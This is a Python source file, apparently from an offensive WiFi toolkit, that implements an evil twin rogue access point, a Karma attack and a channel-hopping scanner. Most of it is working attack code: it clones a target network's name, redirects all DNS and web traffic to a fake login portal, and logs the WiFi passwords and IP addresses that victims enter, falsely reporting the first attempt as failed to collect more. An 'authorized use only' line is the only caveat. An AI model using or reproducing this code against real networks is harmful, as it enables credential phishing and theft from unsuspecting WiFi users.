#!/usr/bin/env python3
"""
Advanced WiFi Attack Modules
=============================
Evil Twin, Karma, KRACK, and more advanced attack vectors

AUTHORIZED USE ONLY
"""

import os
import sys
import time
import subprocess
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import json
from pathlib import Path


class Colors:
    """Enhanced ANSI color codes with effects"""
    # Basic colors
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

    # Ghost theme colors
    GHOST = '\033[38;5;147m'  # Light purple
    PHANTOM = '\033[38;5;213m'  # Pink
    SPOOKY = '\033[38;5;93m'   # Dark purple
    NEON = '\033[38;5;51m'     # Cyan neon
    TOXIC = '\033[38;5;46m'    # Bright green
    BLOOD = '\033[38;5;196m'   # Bright red
    GOLD = '\033[38;5;220m'    # Gold


class CaptivePortalServer(BaseHTTPRequestHandler):
    """HTTP server for captive portal"""

    captured_passwords = []
    ssid = "WiFi Network"

    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

    def do_GET(self):
        """Handle GET requests"""
        if self.path == '/' or self.path.startswith('/?'):
            # Serve main login page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            # Load template
            template_path = Path(__file__).parent / 'templates' / 'captive_portal.html'
            if template_path.exists():
                with open(template_path, 'r') as f:
                    html = f.read().replace('{{SSID}}', self.ssid)
                self.wfile.write(html.encode())
            else:
                self.wfile.write(b"<h1>WiFi Login</h1><form method='POST' action='/capture'><input type='password' name='password'><button>Connect</button></form>")

        elif self.path == '/success':
            # Serve success page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            template_path = Path(__file__).parent / 'templates' / 'success.html'
            if template_path.exists():
                with open(template_path, 'r') as f:
                    html = f.read().replace('{{SSID}}', self.ssid)
                self.wfile.write(html.encode())
            else:
                self.wfile.write(b"<h1>Connected!</h1><p>You are now connected to the network.</p>")

        else:
            # Redirect to captive portal
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()

    def do_POST(self):
        """Handle POST requests"""
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = parse_qs(post_data)

            password = params.get('password', [''])[0]

            if password:
                CaptivePortalServer.captured_passwords.append({
                    'password': password,
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'ip': self.client_address[0]
                })

                print(f"{Colors.TOXIC}👻 PASSWORD CAPTURED: {password} from {self.client_address[0]}{Colors.ENDC}")

            # Send JSON response
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()

            # First attempt always "fails" to get multiple tries
            if len([p for p in CaptivePortalServer.captured_passwords if p['ip'] == self.client_address[0]]) < 2:
                response = json.dumps({'success': False})
            else:
                response = json.dumps({'success': True})

            self.wfile.write(response.encode())


class AdvancedAttacks:
    def __init__(self, interface, verbose=False):
        self.interface = interface
        self.verbose = verbose
        self.processes = []
        self.portal_server = None
        self.portal_thread = None

    def log(self, message, level="INFO"):
        """Print formatted log messages with ghost theme"""
        timestamp = time.strftime("%H:%M:%S")

        icons = {
            "INFO": "👻",
            "SUCCESS": "✨",
            "WARNING": "⚠️",
            "ERROR": "💀",
            "ATTACK": "🔥",
            "CAPTURE": "🎯",
            "GHOST": "👤"
        }

        colors = {
            "INFO": Colors.GHOST,
            "SUCCESS": Colors.TOXIC,
            "WARNING": Colors.GOLD,
            "ERROR": Colors.BLOOD,
            "ATTACK": Colors.PHANTOM,
            "CAPTURE": Colors.NEON,
            "GHOST": Colors.SPOOKY
        }

        icon = icons.get(level, "💬")
        color = colors.get(level, Colors.ENDC)

        print(f"{color}[{timestamp}] {icon} [{level}] {message}{Colors.ENDC}")

    def run_command(self, cmd, shell=False, capture_output=False, show_output=True):
        """Execute system command"""
        if self.verbose:
            print(f"{Colors.OKCYAN}[VERBOSE] {' '.join(cmd) if isinstance(cmd, list) else cmd}{Colors.ENDC}")

        try:
            if capture_output:
                result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=300)
                return result
            else:
                if show_output:
                    return subprocess.run(cmd, shell=shell, timeout=300)
                else:
                    return subprocess.run(cmd, shell=shell, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=300)
        except Exception as e:
            self.log(f"Command failed: {e}", "ERROR")
            return None

    def evil_twin_attack(self, target, duration=300):
        """Launch Evil Twin attack with captive portal"""
        self.log("Launching Evil Twin Attack...", "ATTACK")

        essid = target['essid']
        bssid = target['bssid']
        channel = target['channel']

        print(f"\n{Colors.PHANTOM}{'='*70}")
        print(f"👻 EVIL TWIN ATTACK - Rogue AP Deployment")
        print(f"{'='*70}{Colors.ENDC}\n")

        print(f"  {Colors.GHOST}Target ESSID:{Colors.ENDC} {essid}")
        print(f"  {Colors.GHOST}Target BSSID:{Colors.ENDC} {bssid}")
        print(f"  {Colors.GHOST}Channel:{Colors.ENDC} {channel}")
        print(f"  {Colors.GHOST}Duration:{Colors.ENDC} {duration}s\n")

        # Check for hostapd
        if subprocess.run(['which', 'hostapd'], capture_output=True).returncode != 0:
            self.log("hostapd not found. Install: sudo apt install hostapd", "ERROR")
            return None

        # Check for dnsmasq
        if subprocess.run(['which', 'dnsmasq'], capture_output=True).returncode != 0:
            self.log("dnsmasq not found. Install: sudo apt install dnsmasq", "ERROR")
            return None

        # Create configuration directory
        config_dir = Path.home() / 'wifi_captures' / 'evil_twin'
        config_dir.mkdir(parents=True, exist_ok=True)

        # Create hostapd configuration
        hostapd_conf = config_dir / 'hostapd.conf'
        with open(hostapd_conf, 'w') as f:
            f.write(f"""interface={self.interface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
macaddr_acl=0
ignore_broadcast_ssid=0
""")

        # Create dnsmasq configuration
        dnsmasq_conf = config_dir / 'dnsmasq.conf'
        with open(dnsmasq_conf, 'w') as f:
            f.write(f"""interface={self.interface}
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
""")

        try:
            # Configure interface
            self.log("Configuring rogue AP interface...", "INFO")
            self.run_command(['ip', 'addr', 'add', '192.168.1.1/24', 'dev', self.interface], show_output=False)
            self.run_command(['ip', 'link', 'set', self.interface, 'up'], show_output=False)

            # Enable IP forwarding
            self.run_command(['sysctl', '-w', 'net.ipv4.ip_forward=1'], show_output=False)

            # Start hostapd
            self.log("Starting rogue access point...", "ATTACK")
            hostapd_process = subprocess.Popen(
                ['hostapd', str(hostapd_conf)],
                stdout=subprocess.DEVNULL if not self.verbose else None,
                stderr=subprocess.DEVNULL if not self.verbose else None
            )
            self.processes.append(hostapd_process)
            time.sleep(3)

            # Start dnsmasq
            self.log("Starting DHCP/DNS server...", "INFO")
            dnsmasq_process = subprocess.Popen(
                ['dnsmasq', '-C', str(dnsmasq_conf), '--no-daemon'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(dnsmasq_process)
            time.sleep(2)

            # Start captive portal
            self.log("Starting captive portal server...", "ATTACK")
            CaptivePortalServer.ssid = essid
            CaptivePortalServer.captured_passwords = []

            def run_portal():
                server = HTTPServer(('192.168.1.1', 80), CaptivePortalServer)
                self.portal_server = server
                server.serve_forever()

            self.portal_thread = threading.Thread(target=run_portal, daemon=True)
            self.portal_thread.start()
            time.sleep(1)

            # Set up iptables for captive portal redirect
            self.log("Configuring firewall rules...", "INFO")
            self.run_command(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', self.interface, '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'], show_output=False)
            self.run_command(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', self.interface, '-p', 'tcp', '--dport', '443', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'], show_output=False)

            self.log(f"Evil Twin AP is LIVE! Broadcasting as: {essid}", "SUCCESS")
            self.log("Waiting for victims to connect...", "GHOST")

            print(f"\n{Colors.TOXIC}{'='*70}")
            print(f"  🎣 Phishing Portal Active - Capturing Credentials...")
            print(f"{'='*70}{Colors.ENDC}\n")

            # Monitor for specified duration
            start_time = time.time()
            while time.time() - start_time < duration:
                if CaptivePortalServer.captured_passwords:
                    print(f"\n{Colors.NEON}📊 Captured Passwords ({len(CaptivePortalServer.captured_passwords)}):{Colors.ENDC}")
                    for i, cred in enumerate(CaptivePortalServer.captured_passwords, 1):
                        print(f"  {i}. {cred['password']} - {cred['ip']} @ {cred['timestamp']}")
                    print()

                time.sleep(10)

            self.log("Attack duration completed", "INFO")

            # Return captured passwords
            return CaptivePortalServer.captured_passwords

        except KeyboardInterrupt:
            self.log("Attack interrupted by user", "WARNING")
            return CaptivePortalServer.captured_passwords

        except Exception as e:
            self.log(f"Evil Twin attack error: {e}", "ERROR")
            if self.verbose:
                import traceback
                traceback.print_exc()
            return None

        finally:
            self.cleanup_evil_twin()

    def cleanup_evil_twin(self):
        """Clean up Evil Twin attack"""
        self.log("Cleaning up Evil Twin attack...", "INFO")

        # Stop portal server
        if self.portal_server:
            try:
                self.portal_server.shutdown()
            except:
                pass

        # Kill processes
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except:
                try:
                    proc.kill()
                except:
                    pass

        self.processes = []

        # Remove iptables rules
        try:
            subprocess.run(['iptables', '-t', 'nat', '-F'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

        # Remove IP from interface
        try:
            subprocess.run(['ip', 'addr', 'del', '192.168.1.1/24', 'dev', self.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

        # Kill any lingering hostapd/dnsmasq
        subprocess.run(['killall', 'hostapd'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['killall', 'dnsmasq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def karma_attack(self, duration=300):
        """Karma attack - respond to all probe requests"""
        self.log("Launching Karma Attack...", "ATTACK")

        print(f"\n{Colors.PHANTOM}{'='*70}")
        print(f"🌀 KARMA ATTACK - Universal Probe Response")
        print(f"{'='*70}{Colors.ENDC}\n")

        print(f"  {Colors.GHOST}Mode:{Colors.ENDC} Respond to ALL probe requests")
        print(f"  {Colors.GHOST}Duration:{Colors.ENDC} {duration}s\n")

        # Check for hostapd-mana or hostapd
        has_mana = subprocess.run(['which', 'hostapd-mana'], capture_output=True).returncode == 0

        if has_mana:
            self.log("Using hostapd-mana for Karma attack", "INFO")
            # Configure hostapd-mana for karma
            config_dir = Path.home() / 'wifi_captures' / 'karma'
            config_dir.mkdir(parents=True, exist_ok=True)

            hostapd_conf = config_dir / 'karma.conf'
            with open(hostapd_conf, 'w') as f:
                f.write(f"""interface={self.interface}
driver=nl80211
ssid=FreeWiFi
channel=6
hw_mode=g
enable_karma=1
""")

            try:
                self.log("Starting Karma AP...", "ATTACK")
                karma_process = subprocess.Popen(
                    ['hostapd-mana', str(hostapd_conf)],
                    stdout=subprocess.PIPE if self.verbose else subprocess.DEVNULL,
                    stderr=subprocess.PIPE if self.verbose else subprocess.DEVNULL,
                    text=True
                )
                self.processes.append(karma_process)

                self.log("Karma attack active - Devices will auto-connect", "SUCCESS")

                time.sleep(duration)

                karma_process.terminate()
                karma_process.wait(timeout=5)

            except KeyboardInterrupt:
                self.log("Karma attack stopped", "WARNING")
            except Exception as e:
                self.log(f"Karma attack error: {e}", "ERROR")

        else:
            self.log("hostapd-mana not found. Install for full Karma attack support", "WARNING")
            self.log("Falling back to Evil Twin mode", "INFO")

            # Fall back to basic fake AP
            return self.evil_twin_attack({'essid': 'FreeWiFi', 'bssid': '00:00:00:00:00:00', 'channel': '6'}, duration)

    def channel_hop_scan(self, duration=60):
        """Scan all channels with rapid hopping"""
        self.log("Starting Channel Hopping Scanner...", "ATTACK")

        print(f"\n{Colors.NEON}{'='*70}")
        print(f"📡 CHANNEL HOPPING SCANNER")
        print(f"{'='*70}{Colors.ENDC}\n")

        networks_found = {}
        channels = list(range(1, 14))  # 2.4GHz channels
        hop_interval = duration / len(channels) / 10  # Hop fast

        try:
            for cycle in range(10):  # 10 cycles through all channels
                for channel in channels:
                    # Set channel
                    subprocess.run(['iwconfig', self.interface, 'channel', str(channel)],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                    # Quick scan on this channel
                    result = subprocess.run(
                        ['timeout', '0.5', 'airodump-ng', '--channel', str(channel),
                         '-w', '/tmp/scan_temp', '--output-format', 'csv', self.interface],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )

                    if self.verbose:
                        print(f"  Hopped to channel {channel}", end='\r')

                    time.sleep(hop_interval)

            self.log(f"Channel hopping complete - scanned {len(channels)} channels {10} times", "SUCCESS")

        except KeyboardInterrupt:
            self.log("Channel hopping interrupted", "WARNING")

        # Clean up temp files
        for f in Path('/tmp').glob('scan_temp*'):
            try:
                f.unlink()
            except:
                pass

        return True


def main():
    print(f"{Colors.PHANTOM}Advanced WiFi Attack Modules Loaded{Colors.ENDC}")


if __name__ == '__main__':
    main()
